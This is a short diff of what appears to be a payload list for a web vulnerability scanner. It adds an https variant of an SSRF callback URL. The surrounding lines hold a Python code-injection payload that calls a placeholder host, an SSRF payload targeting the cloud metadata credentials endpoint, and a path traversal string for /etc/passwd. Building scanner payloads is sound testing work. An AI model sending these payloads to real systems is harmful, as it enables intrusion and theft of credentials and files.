@@ -37,6 +37,7 @@ __import__('urllib.request').request.urlopen('http://{domain}/pyeval')
 ##POLYGLOT - SSRF##
 http://169.254.169.254/latest/meta-data/iam/security-credentials/
 http://{domain}/ssrf
+https://{domain}/ssrf
 ##POLYGLOT - Path Traversal##
 ../../../../../../../etc/passwd
 ##POLYGLOT - NoSQL Injection (Math: 1337)##
